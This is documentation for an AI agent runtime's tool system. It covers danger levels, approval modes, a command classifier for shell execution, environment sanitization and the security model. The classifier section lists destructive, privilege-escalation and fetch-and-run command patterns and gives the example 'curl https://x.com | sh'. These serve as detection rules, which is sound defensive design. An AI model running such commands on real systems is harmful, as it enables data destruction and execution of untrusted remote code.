# Built-in Tools

SA exposes 14 runtime tools to the agent. Each tool carries a **danger level** that governs
approval behavior and event reporting across connectors.

| # | Tool | Danger Level | Purpose |
|---|------|-------------|---------|
| 1 | `read` | safe | Read file contents |
| 2 | `write` | moderate | Create/overwrite files |
| 3 | `edit` | moderate | Exact single-occurrence string replacement |
| 4 | `exec` | dangerous* | Execute shell commands (hybrid classification) |
| 5 | `exec_status` | safe | Check status/output of a background process |
| 6 | `exec_kill` | dangerous | Kill a background process |
| 7 | `web_fetch` | safe | Fetch a URL and return content as markdown |
| 8 | `web_search` | safe | Web search via Brave or Perplexity |
| 9 | `reaction` | safe | React to a message with an emoji (IM connectors) |
| 10 | `remember` | safe | Save memory entry by key |
| 11 | `read_skill` | safe | Load and activate a skill by name |
| 12 | `set_env_secret` | safe | Store a secret in the encrypted vault (secrets.enc) |
| 13 | `set_env_variable` | safe | Set a plain environment variable in config.json |
| 14 | `notify` | safe | Push notification to Telegram/Discord |

*The `exec` tool is registered as `dangerous` but uses **hybrid classification** at runtime --
see "Exec hybrid approval" below.

---

## Tool danger classification system

Every tool declares a `dangerLevel` of one of three tiers:

### `safe` -- auto-approve, low visibility

Read-only or side-effect-free operations. These tools never trigger approval prompts regardless
of connector configuration. They are suppressed from IM reporting by default.

**Examples:** `read`, `web_fetch`, `web_search`, `remember`, `reaction`,
`read_skill`, `exec_status`, `set_env_secret`, `set_env_variable`, `notify`

### `moderate` -- context-dependent approval

Tools that modify state in a reversible or bounded way. Whether they require approval depends
on the connector's approval mode. They appear in TUI reporting but are suppressed in IM
connectors under the default `silent` verbosity.

**Examples:** `write`, `edit`

### `dangerous` -- always requires approval

Destructive or irreversible operations. These tools always prompt for user approval, even when
the connector's approval mode is set to `"never"`. They are always reported in all verbosity
modes except when explicitly overridden.

**Examples:** `exec` (base registration), `exec_kill`

Unknown or unregistered tools default to `dangerous` as a safety fallback.

---

## 3-tier approval flow

Tool approval is the combination of two inputs: the tool's **effective danger level** and the
connector's **approval mode**.

### Approval modes (per-connector)

Each connector type has an independent approval mode configured in `config.json` under
`runtime.toolApproval`:

| Mode | Description | Default for |
|------|-------------|-------------|
| `"never"` | Auto-approve safe and moderate tools | TUI, webhook |
| `"ask"` | Prompt for dangerous tools, auto-approve safe and moderate | Telegram, Discord |
| `"always"` | Prompt for dangerous and moderate tools, auto-approve safe only | (none by default) |

### Approval decision matrix

| Danger Level | Mode: `"never"` | Mode: `"ask"` | Mode: `"always"` |
|-------------|-----------------|---------------|------------------|
| `safe` | auto-approve | auto-approve | auto-approve |
| `moderate` | auto-approve | auto-approve | **prompt** |
| `dangerous` | **prompt** | **prompt** | **prompt** |

Key design points:

- **Safe tools never prompt.** Even under `"always"` mode, safe tools are auto-approved. This
  prevents the agent from being blocked on read-only operations.
- **Dangerous tools always prompt.** Even under `"never"` mode, dangerous tools require
  explicit approval. This is the security backstop -- there is no way to fully disable approval
  for destructive operations without a per-tool override.
- **Moderate tools are the swing tier.** They auto-approve in `"never"` and `"ask"` modes, but
  require approval under `"always"`.

### Approval timeout

Pending approval requests expire after **5 minutes**. If the user does not respond, the tool
call is rejected (returns `false`).

### Session-level overrides

When a user approves a dangerous tool call, connectors may offer a "trust this tool for this
session" option. Session-level tool overrides are stored in memory and bypass the approval
prompt for subsequent calls to the same tool within the same session.

### Default configuration

```json
{
  "runtime": {
    "toolApproval": {
      "tui": "never",
      "telegram": "ask",
      "discord": "ask",
      "webhook": "never"
    }
  }
}
```

---

## Exec hybrid approval

The `exec` tool is special. It is registered with `dangerLevel: "dangerous"` as a conservative
default, but at runtime the engine applies **hybrid classification** that can downgrade or
upgrade the effective danger level based on the actual command string.

### How it works

1. The agent submits an `exec` call with a `command` string and an optional `danger`
   self-declaration (`"safe"`, `"moderate"`, or `"dangerous"`; defaults to `"dangerous"` if
   omitted).
2. Before approval, the engine passes the command through `classifyExecCommand()` in
   `exec-classifier.ts`.
3. The classifier applies three priority levels:

```
Priority 1: ALWAYS_DANGEROUS patterns  --> forced to "dangerous"
Priority 2: ALWAYS_SAFE heuristics     --> forced to "safe"
Priority 3: Otherwise                  --> trust the agent's self-declaration
```

### Always-dangerous patterns

These regex patterns override any agent declaration and force `dangerous` classification:

| Category | Patterns |
|----------|----------|
| Destructive file ops | `rm -rf`, `rm -f`, `rm --recursive`, `rm --force`, `rm ... /`, `mkfs`, `dd`, `shred` |
| Privilege escalation | `sudo`, `su`, `doas` |
| System control | `shutdown`, `reboot`, `systemctl start/stop/restart/enable/disable`, `launchctl load/unload/remove/kill` |
| Process killing | `kill`, `killall`, `pkill` |
| Permission changes | `chmod`, `chown` |
| Remote code execution | `curl ... \|`, `wget ... \|`, `\| sh`, `\| bash`, `\| zsh`, `\| source` |
| Disk operations | `fdisk`, `parted`, `mount`, `umount` |
| Network firewall | `iptables`, `nft` |

### Always-safe commands

Simple invocations of these commands (without pipes, semicolons, or `&&`) are forced to `safe`:

`ls`, `ll`, `la`, `pwd`, `echo`, `cat`, `head`, `tail`, `less`, `more`, `wc`, `sort`, `uniq`,
`tr`, `cut`, `paste`, `date`, `cal`, `whoami`, `id`, `hostname`, `uname`, `which`, `where`,
`type`, `command`, `file`, `stat`, `tree`, `du`, `df`, `env`, `printenv`, `true`, `false`,
`test`, `[`, `basename`, `dirname`, `realpath`, `readlink`, `md5`, `md5sum`, `shasum`,
`sha256sum`, `diff`, `cmp`, `jq`, `yq`, `man`, `help`, `info`

### Safe git subcommands

When the base command is `git`, these subcommands are classified as `safe`:

`status`, `log`, `diff`, `show`, `branch`, `tag`, `remote`, `stash list`, `config --list`,
`config --get`, `ls-files`, `ls-tree`, `cat-file`, `rev-parse`, `describe`, `shortlog`,
`blame`, `reflog`

All other git subcommands (e.g., `git push`, `git commit`, `git checkout`) fall through to the
agent's self-declaration.

### Examples

| Command | Agent declares | Effective level | Reason |
|---------|---------------|-----------------|--------|
| `ls -la` | `dangerous` | **safe** | Always-safe command |
| `git status` | `dangerous` | **safe** | Safe git subcommand |
| `rm -rf /tmp/foo` | `safe` | **dangerous** | Always-dangerous pattern |
| `sudo apt update` | `safe` | **dangerous** | Always-dangerous pattern |
| `curl https://x.com \| sh` | `safe` | **dangerous** | Remote code execution pattern |
| `npm install` | `moderate` | **moderate** | Trusts agent declaration |
| `git push` | `moderate` | **moderate** | Trusts agent declaration |
| `python3 script.py` | `moderate` | **moderate** | Trusts agent declaration |
| `some-unknown-cmd` | (omitted) | **dangerous** | Default when no declaration |

### Environment sanitization

The `exec` tool strips sensitive environment variables from the subprocess environment before
execution. Variables matching these patterns are removed:

- `*_KEY` (e.g., `ANTHROPIC_API_KEY`, `BRAVE_API_KEY`)
- `*_TOKEN` (e.g., `TELEGRAM_BOT_TOKEN`)
- `*_SECRET`
- `SA_*` (all SA-internal variables)
- `ANTHROPIC_*`, `OPENAI_*`, `GOOGLE_AI_*`, `OPENROUTER_*`

User-provided `env` overrides in the tool call are merged after sanitization, so explicit
overrides can re-inject specific variables if needed.

---

## Per-tool config overrides

The `toolPolicy.overrides` section in `config.json` allows overriding both the **danger level**
and the **reporting behavior** of any tool on a per-tool basis.

### Schema

```json
{
  "runtime": {
    "toolPolicy": {
      "overrides": {
        "<tool_name>": {
          "dangerLevel": "safe" | "moderate" | "dangerous",
          "report": "always" | "never" | "on_error"
        }
      }
    }
  }
}
```

Both fields are optional. You can override just the danger level, just the reporting, or both.

### `dangerLevel` override

Changes the tool's effective danger level for **approval decisions**. This takes precedence
over the built-in registration level.

Example -- promote `write` from moderate to dangerous:

```json
{
  "runtime": {
    "toolPolicy": {
      "overrides": {
        "write": { "dangerLevel": "dangerous" }
      }
    }
  }
}
```

This means `write` will now always require approval, even in `"never"` mode.

Example -- demote `read` to dangerous (paranoid mode):

```json
{
  "runtime": {
    "toolPolicy": {
      "overrides": {
        "read": { "dangerLevel": "dangerous" }
      }
    }
  }
}
```

### `report` override

Controls whether the tool's `tool_start` and `tool_end` events are emitted to connectors,
independent of the verbosity level:

| Value | `tool_start` | `tool_end` (success) | `tool_end` (error) |
|-------|-------------|---------------------|-------------------|
| `"always"` | emitted | emitted | emitted |
| `"never"` | suppressed | suppressed | **emitted** (errors always surface) |
| `"on_error"` | follows verbosity | suppressed | emitted |

Note: even with `report: "never"`, tool errors are still emitted. This is a deliberate safety
decision -- suppressing error visibility could mask failures.

Example -- always show `exec` results on Telegram (even in silent mode):

```json
{
  "runtime": {
    "toolPolicy": {
      "overrides": {
        "exec": { "report": "always" }
      }
    }
  }
}
```

Example -- suppress `remember` reporting everywhere:

```json
{
  "runtime": {
    "toolPolicy": {
      "overrides": {
        "remember": { "report": "never" }
      }
    }
  }
}
```

### Override resolution order

For danger level: `overrides[tool].dangerLevel` > built-in `dangerLevel` > `"dangerous"` (fallback for unknown tools).

For exec specifically: the exec classifier runs **after** the override resolution, so
`toolPolicy.overrides.exec.dangerLevel` is effectively ignored in favor of the hybrid
classification. The exec classifier operates on the command string, not the tool's base
registration.

---

## Tool policy verbosity

Per-connector **verbosity** controls how much detail about tool execution is forwarded to the
connector. This is distinct from approval -- verbosity governs the `tool_start` and `tool_end`
events that appear as status messages in IM connectors.

### Verbosity levels

| Level | `tool_start` shown for | `tool_end` shown for |
|-------|----------------------|---------------------|
| `"verbose"` | All tools | All tools |
| `"minimal"` | Moderate + dangerous | Dangerous + errors |
| `"silent"` | Dangerous only (+ long-running >10s) | Errors only |

### Defaults

| Connector | Default verbosity |
|-----------|------------------|
| TUI | `minimal` |
| Telegram | `silent` |
| Discord | `silent` |
| Webhook | `silent` |

### Configuration

```json
{
  "runtime": {
    "toolPolicy": {
      "verbosity": {
        "tui": "minimal",
        "telegram": "verbose",
        "discord": "silent"
      }
    }
  }
}
```

### Why IM connectors default to silent

Telegram and Discord have rate limits on message edits and sends. Emitting `tool_start` for
every `read` or `web_search` would produce excessive status messages. The `silent` default
ensures only critical information (dangerous tool invocations, errors, long-running tasks) is
surfaced. Users who want full visibility can switch to `"verbose"`.

### Long-running task detection

In `silent` mode, if a tool has been running for more than **10 seconds** (tracked via
`elapsedMs` in the event context), its `tool_start` event is emitted even for safe/moderate
tools. This provides visibility into unexpectedly slow operations without cluttering the chat
with fast-completing tool calls.

---

## Tool reference

### `read`

Read file contents as text.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `file_path` | string | Yes | Absolute file path |
| `offset` | number | No | Start line (1-based, default `1`) |
| `limit` | number | No | Max lines to return |

### `write`

Write full content to a file (creates parent directories, overwrites existing file).

| Parameter | Type | Required | Description |
|---|---|---|---|
| `file_path` | string | Yes | Absolute file path |
| `content` | string | Yes | Full file content |

### `edit`

Exact string replacement. `old_string` must appear exactly once.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `file_path` | string | Yes | Absolute file path |
| `old_string` | string | Yes | Exact string to replace |
| `new_string` | string | Yes | Replacement string |

### `exec`

Execute a shell command (`sh -c`). Supports working directory, environment overrides,
background mode, yield timeout (auto-background after delay), and process timeout. Sensitive
env vars are stripped by default.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `command` | string | Yes | Shell command |
| `danger` | string | No | Self-declared danger level: `"safe"`, `"moderate"`, or `"dangerous"` (default `"dangerous"`) |
| `workdir` | string | No | Working directory (defaults to cwd) |
| `env` | object | No | Environment variable overrides merged with sanitized `process.env` |
| `background` | boolean | No | Start in background immediately and return a handle |
| `yieldMs` | number | No | Auto-background after this many ms if still running (default `10000`; `0` to wait indefinitely up to timeout) |
| `timeout` | number | No | Kill after this many seconds (default `300` foreground, `1800` background) |

Output is capped at **1 MB** to prevent OOM from chatty commands.

### `exec_status`

Check status and output of a background `exec` process.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `handle` | string | Yes | Background process handle returned by `exec` |

### `exec_kill`

Kill a background `exec` process and return its final output.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `handle` | string | Yes | Background process handle to kill |

### `web_fetch`

Fetch a URL and return its content. HTML is converted to markdown; JSON/text/XML returned
as-is.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `url` | string | Yes | The URL to fetch |
| `maxLength` | number | No | Max characters to return (default `50000`) |
| `headers` | object | No | Additional HTTP headers to send |

### `web_search`

Search the web using Brave Search or Perplexity API. Auto-selects the available backend based
on configured API keys (`BRAVE_API_KEY` or `PERPLEXITY_API_KEY`).

| Parameter | Type | Required | Description |
|---|---|---|---|
| `query` | string | Yes | Search query |
| `count` | number | No | Number of results (default `5`) |
| `backend` | string | No | `"brave"`, `"perplexity"`, or `"auto"` (default) |

### `reaction`

React to the user's message with an emoji. The reaction is forwarded to IM connectors
(Telegram, Discord) as a native message reaction.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `emoji` | string | Yes | Emoji character |

### `remember`

Save a memory topic entry under the configured memory directory.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `key` | string | Yes | Memory key (sanitized to filename-safe form) |
| `content` | string | Yes | Content to save |

### `read_skill`

Load and activate a skill from the discovered skill list.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `name` | string | Yes | Skill name from `<available_skills>` |

### `set_env_secret`

Store a sensitive value (API key, token, password) in SA's encrypted vault (`secrets.enc`).
The value is injected as an environment variable immediately and persists across restarts.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `name` | string | Yes | Environment variable name (e.g. `BRAVE_API_KEY`) |
| `value` | string | Yes | The secret value |

### `set_env_variable`

Set a non-sensitive environment variable in `config.json` (`runtime.env`). The value is
injected immediately and persists across restarts. Do not use for secrets -- use
`set_env_secret` instead.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `name` | string | Yes | Environment variable name (e.g. `SA_LOG_LEVEL`) |
| `value` | string | Yes | The value to set |

### `notify`

Send a push notification to the user via Telegram or Discord. This tool sends messages
directly via HTTP to the platform APIs -- it does not go through the connector's tRPC
session. It is used by the heartbeat scheduler and cron tasks to deliver results when the
user is not actively chatting.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `message` | string | Yes | The notification text (supports Markdown) |
| `connector` | string | No | Target: `"telegram"`, `"discord"`, or `"all"` (default: `"all"`) |

**Requirements:**

- **Telegram:** Requires `botToken` and `pairedChatId` in `secrets.enc`. The bot token is the
  Telegram Bot API token; the paired chat ID is set during onboarding when the user sends
  `/pair <code>` to the bot.
- **Discord:** Requires `discordToken` in `secrets.enc` and `SA_DISCORD_NOTIFY_CHANNEL`
  environment variable (the channel ID to send messages to).

When `connector` is `"all"`, the tool attempts both platforms and reports which succeeded. If
neither is configured, it returns an informational message directing the user to run
`sa onboard`.

**Use cases:**

- Heartbeat check-in results (e.g., "No pending tasks, all clear")
- Cron task completion reports (e.g., daily summary, scheduled reminders)
- Webhook-triggered task results
- Any scenario where the agent needs to proactively reach the user

---

## Security model summary

SA is a **single-user, localhost-only personal agent**. The security model reflects this:

1. **No sandboxing.** The `exec` tool runs commands as the SA process user with full filesystem
   and network access. There is no chroot, cgroup, or firewall isolation.
2. **Approval is the primary gate.** The 3-tier danger classification combined with per-connector
   approval modes ensures destructive operations require explicit user consent.
3. **Defense in depth for exec.** The hybrid classifier overrides the agent's self-declaration
   when known-dangerous patterns are detected, preventing prompt-injection attacks from
   bypassing approval by claiming `danger: "safe"` on destructive commands.
4. **Environment sanitization.** API keys, tokens, and secrets are stripped from subprocess
   environments to prevent credential leakage through command output or environment inspection.
5. **Output capping.** Tool output is truncated at 1 MB to prevent memory exhaustion from
   verbose commands.
6. **Approval timeout.** Unanswered approval requests auto-reject after 5 minutes to prevent
   indefinite agent hangs.
7. **Tool loop detection.** The agent has configurable thresholds for detecting repeated
   identical tool calls (warn at 10, block at 20, circuit-break at 30) to prevent runaway
   tool invocation loops.
